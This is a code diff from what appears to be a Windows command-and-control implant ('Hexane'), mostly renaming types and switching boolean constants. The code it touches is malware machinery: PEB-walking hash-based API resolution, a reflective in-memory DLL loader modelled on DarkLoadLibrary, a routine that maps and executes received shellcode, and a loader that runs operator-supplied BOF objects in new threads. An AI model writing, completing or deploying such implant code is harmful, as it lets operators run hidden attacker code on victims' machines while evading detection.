@@ -13,8 +13,7 @@ namespace Memory {
         UINT_PTR GetStackCookie() {
             HEXANE;
 
-            uintptr_t cookie = 0;
-
+            UINT_PTR cookie = 0;
             if (!NT_SUCCESS(ntstatus = ctx->procapi.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                 return 0;
             }
@@ -22,11 +21,11 @@ namespace Memory {
             return cookie;
         }
 
-        _resource* GetIntResource(HMODULE base, const int rsrc_id) {
+        PRESOURCE GetIntResource(HMODULE base, CONST INT rsrc_id) {
             HEXANE;
 
-            HRSRC rsrc_info      = { };
-            _resource *object   = (_resource*) Malloc(sizeof(_resource));
+            HRSRC rsrc_info		= { };
+            PRESOURCE object	= (RESOURCE*) Malloc(sizeof(_resource));
 
             x_assert(rsrc_info          = ctx->utilapi.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
             x_assert(object->h_global   = ctx->utilapi.LoadResource(base, rsrc_info));
@@ -37,10 +36,10 @@ namespace Memory {
             return object;
         }
 
-        _executable* CreateImageData(uint8_t *data) {
+        PEXECUTABLE CreateImage(UINT8 *data) {
             HEXANE;
 
-            _executable *image = (_executable*) Malloc(sizeof(_executable));
+            auto image = (EXECUTABLE*) Malloc(sizeof(_executable));
 
             image->buffer   = data;
             image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(data) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
@@ -56,9 +55,10 @@ namespace Memory {
 
         BOOL ContextInit() {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
+        	HEXANE;
 
             _hexane instance    = { };
-            void *region        = { };
+            VOID *region        = { };
 
             instance.teb    = NtCurrentTeb();
             instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
@@ -68,24 +68,24 @@ namespace Memory {
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
             if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
-                return false;
+                return FALSE;
             }
 
             F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
             if (!instance.memapi.RtlAllocateHeap) {
-                return false;
+                return FALSE;
             }
 
             region = RVA(PBYTE, instance.base.address, &__instance);
             if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
-                return false;
+                return FALSE;
             }
 
             MemCopy(C_DREF(region), &instance, sizeof(_hexane));
             MemSet(&instance, 0, sizeof(_hexane));
             MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
 
-            return true;
+            return TRUE;
         }
 
         VOID ContextDestroy() {
@@ -107,14 +107,14 @@ namespace Memory {
     }
 
     namespace Modules {
-	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(const uint32_t hash) {
+	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(CONST UINT32 hash) {
 		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
 		    for (auto next = head->Flink; next != head; next = next->Flink) {
 			    const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 			    const auto name = mod->BaseDllName;
 
-			    wchar_t buffer[MAX_PATH] = {};
+			    wchar_t buffer[MAX_PATH] = { };
 
 			    if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
 				    return mod;
@@ -124,7 +124,7 @@ namespace Memory {
 		    return nullptr;
 	    }
 
-	    FARPROC GetExportAddress(const void *base, const uint32_t hash) {
+	    FARPROC GetExportAddress(CONST VOID *base, CONST UINT32 hash) {
 		    FARPROC address = nullptr;
 
 		    const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
@@ -149,11 +149,11 @@ namespace Memory {
 		    return address;
 	    }
 
-	    UINT_PTR LoadExport(const char *module_name, const char *export_name) {
+	    UINT_PTR LoadExport(CONST CHAR *module_name, CONST CHAR *export_name) {
 		    HEXANE;
 
 		    uintptr_t symbol = 0;
-		    bool reload = false;
+		    bool reload = FALSE;
 
 		    char buffer[MAX_PATH] = {};
 
@@ -168,7 +168,7 @@ namespace Memory {
 					    // this is sus...
 					    goto defer;
 				    }
-				    reload = true;
+				    reload = TRUE;
 			    }
 		    }
 
@@ -176,67 +176,68 @@ namespace Memory {
 		    return symbol;
 	    }
 
-	    BOOL ParseFileName(PLOADMODULE module, LPWSTR filename) {
+	    BOOL ParseFileName(EXECUTABLE *module, WCHAR *filename) {
 	    	HEXANE;
 
 		    if (!filename) {
-			    return false;
+			    return FALSE;
 		    }
 
 		    module->local_name		= filename;
 		    module->cracked_name	= (PWCHAR) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, MAX_PATH * 2);
 
 		    if (!module->cracked_name) {
-			    return false;
+			    return FALSE;
 		    }
 
-		    LPWSTR location = ctx->ioapi.PathFindFileNameW(filename);
+		    CONST WCHAR *location = ctx->ioapi.PathFindFileNameW(filename);
 		    MemCopy(module->cracked_name, location, (WcsLength(location) % (MAX_PATH - 1)) * 2);
 
-		    return true;
+		    return TRUE;
 	    }
 
-	    BOOL ReadFileToBuffer(PLOADMODULE module) {
+	    BOOL ReadFileToBuffer(PEXECUTABLE module) {
 	    	HEXANE;
 
 		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
 		    if (handle == INVALID_HANDLE_VALUE) {
-			    return false;
+			    return FALSE;
 		    }
 
 		    DWORD size = ctx->ioapi.GetFileSize(handle, nullptr);
 		    if (size == INVALID_FILE_SIZE) {
 			    ctx->utilapi.NtClose(handle);
-			    return false;
+			    return FALSE;
 		    }
 
 		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, size, (PSIZE_T) &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
 			    ctx->utilapi.NtClose(handle);
-			    return false;
+			    return FALSE;
 		    }
 
-		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, &module->length, nullptr)) {
-		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, (PSIZE_T) &module->length, 0);
+		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, (LPDWORD) &module->size, nullptr)) {
+		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, &module->size, 0);
 			    ctx->utilapi.NtClose(handle);
-			    return false;
+			    return FALSE;
 		    }
 
 		    ctx->utilapi.NtClose(handle);
-		    return true;
+		    return TRUE;
 	    }
 
-	    PLOADMODULE LoadModule(uint32_t flags, wchar_t *filename, uint8_t *buffer, uint32_t length, wchar_t *name) {
+	    PEXECUTABLE LoadModule(CONST UINT32 flags, WCHAR *filename, UINT8 *buffer, CONST UINT32 length, WCHAR *name) {
 	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
+	    	// TODO: see if this can be used on bofs
 	    	HEXANE;
 
-		    auto module = (LOADMODULE*) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(LOADMODULE));
-		    if (!module)
+		    auto module = (EXECUTABLE*) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
+		    if (!module) {
 			    return nullptr;
+		    }
 
-		    module->success	= false;
-		    module->linked	= true;
+		    module->success	= FALSE;
+		    module->link	= TRUE;
 
-		    // get the DLL data into memory, whatever the format it's in
 		    switch (LOWORD(flags)) {
 		    	case LoadLocalFile:
 				    if (!ParseFileName(module, filename) || !ReadFileToBuffer(module)) {
@@ -245,7 +246,7 @@ namespace Memory {
 				    break;
 
 			    case LoadMemory:
-				    module->length			= length;
+				    module->size			= length;
 				    module->buffer			= buffer;
 				    module->cracked_name	= name;
 				    module->local_name		= name;
@@ -260,37 +261,30 @@ namespace Memory {
 		    }
 
 		    if (flags & NoLink)
-			    module->linked = false;
+			    module->link = FALSE;
 
-		    // is there a module with the same name already loaded
 		    if (name == nullptr) {
 			    name = module->cracked_name;
 		    }
 
-		    PLDR_DATA_TABLE_ENTRY check_module = GetModuleEntry(HashStringW(name, WcsLength(name)));
-
-		    if (check_module) {
+		    if (PLDR_DATA_TABLE_ENTRY check_module = GetModuleEntry(HashStringW(name, WcsLength(name)))) {
 			    module->base	= (ULONG_PTR) check_module->DllBase;
-			    module->success	= true;
+			    module->success	= TRUE;
 
 			    goto defer;
 		    }
 
-		    // make sure the PE we are about to load is valid
-	    	auto image = Methods::CreateImageData(module->buffer);
+	    	auto image = Methods::CreateImage(module->buffer);
 		    if (!ImageCheckArch(image)) {
 		    	goto defer;
 		    }
 
+	    	// DestroyImage(module);
 	    	Free(image);
 
 		    // map the sections into memory
-		    if (!MapSections(module)) {
-			    goto defer;
-		    }
-
-		    // handle the import tables
-		    if (!ResolveImports(module)) {
+		    if (!MapSections(module) ||
+				!ResolveImports(module)) {
 			    goto defer;
 		    }
 
@@ -305,14 +299,13 @@ namespace Memory {
 			    goto defer;
 		    }
 
-		    module->success = true;
+		    module->success = TRUE;
 
 	    defer:
 		    return module;
 	    }
 
-	    BOOL ConcealLibrary(LOADMODULE pdModule, BOOL bConceal) {
-		    // TODO: reimplement this function, so it is better
+	    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
 		    return FALSE;
 	    }
     }
@@ -326,32 +319,32 @@ namespace Memory {
 
             const auto cmd_id = UnpackUint32(&parser);
             if (cmd_id == NOJOB) {
-                return true;
+                return TRUE;
             }
 
             if (!(pointer = GetCommandAddress(cmd_id))) {
                 // LOG ERROR
-                return false;
+                return FALSE;
             }
 
             const auto cmd = (COMMAND) RVA(PBYTE, ctx->base.address, pointer);
             cmd(&parser);
 
-            return true;
+            return TRUE;
         }
 
-        BOOL ExecuteShellcode(_parser parser) {
+        BOOL ExecuteShellcode(CONST PARSER &parser) {
             HEXANE;
 
-            void* base      = nullptr;
-            void(*exec)()   = nullptr;
+            VOID* base      = nullptr;
+            VOID (*exec)()  = nullptr;
 
-            bool success = true;
+            BOOL success = TRUE;
             size_t size = parser.length;
 
             if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 // LOG ERROR
-                success = false;
+                success = FALSE;
                 goto defer;
             }
 
@@ -359,7 +352,7 @@ namespace Memory {
 
             if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                 // LOG ERROR
-                success = false;
+                success = FALSE;
                 goto defer;
             }
 
@@ -379,27 +372,27 @@ namespace Memory {
         VOID LoadObject(_parser parser) {
             HEXANE;
 
-            _coff_params* coff  = (_coff_params*) Malloc(sizeof(_coff_params));
-            _coff_params* saved = nullptr;
+            PCOFF_PARAMS coff  = (_coff_params*) Malloc(sizeof(_coff_params));
+            PCOFF_PARAMS saved = nullptr;
 
-            coff->entrypoint    = UnpackString(&parser, (uint32_t*) &coff->entrypoint_length);
-            coff->data          = UnpackBytes(&parser, (uint32_t*) &coff->data_size);
-            coff->args          = UnpackBytes(&parser, (uint32_t*) &coff->args_size);
+            coff->entrypoint    = UnpackString(&parser, (UINT32*) &coff->entrypoint_length);
+            coff->data          = UnpackBytes(&parser, (UINT32*) &coff->data_size);
+            coff->args          = UnpackBytes(&parser, (UINT32*) &coff->args_size);
             coff->b_cache       = UnpackByte(&parser);
-            coff->coff_id       = UnpackUint32(&parser);
+            coff->bof_id		= UnpackUint32(&parser);
             coff->task_id       = ctx->session.current_taskid;
 
             // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
             // TODO: test that coff data size being zero is a correct way to do this
 
             if (!coff->data_size) {
-                saved = GetCoff(coff->coff_id);
+                saved = GetCoff(coff->bof_id);
 
                 coff->data      = saved->data;
                 coff->data_size = saved->data_size;
             }
 
-            if (!CreateUserThread(NtCurrentProcess(), (void*) CoffThread, coff, nullptr)) {
+            if (!CreateUserThread(NtCurrentProcess(), (VOID*) CoffThread, coff, nullptr)) {
                 // LOG ERROR
                 // do not return
             }
@@ -409,11 +402,11 @@ namespace Memory {
             }
 
             // NOTE: keep original task_id after every run or update (?)
-            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
+            // NOTE: operator now has the option to remove a BOF any time with b_cache (FALSE == "remove")
             // TODO: server should keep BOF information stored locally for this
 
             if (!coff->b_cache) {
-                RemoveCoff(coff->coff_id);
+                RemoveCoff(coff->bof_id);
             }
         }
     }
